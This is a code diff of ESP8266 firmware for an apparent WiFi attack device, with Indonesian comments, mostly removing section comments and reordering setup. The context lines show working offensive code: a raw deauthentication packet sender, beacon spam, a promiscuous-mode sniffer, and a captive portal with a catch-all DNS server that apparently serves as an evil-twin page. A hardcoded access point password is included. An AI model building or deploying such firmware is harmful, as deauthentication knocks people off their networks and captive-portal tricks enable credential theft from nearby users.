@@ -66,11 +66,9 @@ unsigned long last_deauth = 0;
 unsigned long last_beacon = 0;
 unsigned long last_scan = 0;
 
-// --- WHITELIST LOGIC ---
 void updateAdminWhitelist() {
   struct station_info *stat_info = wifi_softap_get_station_info();
   while (stat_info != NULL) {
-    // FIX: Bandingkan IPAddress secara langsung agar compatible dengan compiler GitHub
     if (IPAddress(stat_info->ip.addr) == webServer.client().remoteIP()) {
       memcpy(adminMAC, stat_info->bssid, 6);
       break;
@@ -80,11 +78,10 @@ void updateAdminWhitelist() {
   wifi_softap_free_station_info();
 }
 
-// --- SNIFFER CALLBACK ---
 void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len) {
   if (len == 128) {
     struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
-    if (sniffer->buf[0] == 0x80) { // Beacon
+    if (sniffer->buf[0] == 0x80) {
       String essid = "";
       int ssidLen = sniffer->buf[37];
       if (ssidLen == 0) essid = "<HIDDEN>";
@@ -103,7 +100,6 @@ void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len) {
   }
 }
 
-// --- ATTACK ENGINES ---
 void sendDeauth(uint8_t* targetBssid, uint8_t ch) {
   if (memcmp(targetBssid, adminMAC, 6) == 0) return;
   uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
@@ -130,7 +126,6 @@ void sendBeaconSpam() {
   }
 }
 
-// --- WEB SERVER ---
 String bytesToStr(const uint8_t* b, uint32_t size) {
   String str = "";
   for (uint32_t i = 0; i < size; i++) {
@@ -191,26 +186,28 @@ void handleResult() {
   webServer.send(200, "text/html", "<html><script>window.location.href='/';</script></html>");
 }
 
-// --- MAIN SETUP ---
 void setup() {
   Serial.begin(115200); pinMode(LED_PIN, OUTPUT);
   display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
   display.clearDisplay(); display.setTextColor(WHITE);
   display.setCursor(0,10); display.println("GMPRO87 BOOT..."); display.display();
 
+  // --- URUTAN SAKTI BIAR SSID MUNCUL ---
   WiFi.mode(WIFI_AP_STA);
-  wifi_promiscuous_enable(1);
-  wifi_set_promiscuous_rx_cb(promisc_cb);
-  
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-  WiFi.softAP("GMpro", "Sangkur87");
+  WiFi.softAP("GMpro", "Sangkur87"); // Nyalain WiFi dulu
 
   dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
   webServer.on("/", handleIndex); webServer.on("/result", handleResult);
   webServer.onNotFound(handleIndex); webServer.begin();
+
+  delay(500); // Kasih waktu biar AP-nya stabil
+
+  // Baru sniffer nyala belakangan
+  wifi_promiscuous_enable(1);
+  wifi_set_promiscuous_rx_cb(promisc_cb);
 }
 
-// --- MAIN LOOP ---
 void loop() {
   dnsServer.processNextRequest(); webServer.handleClient();
 
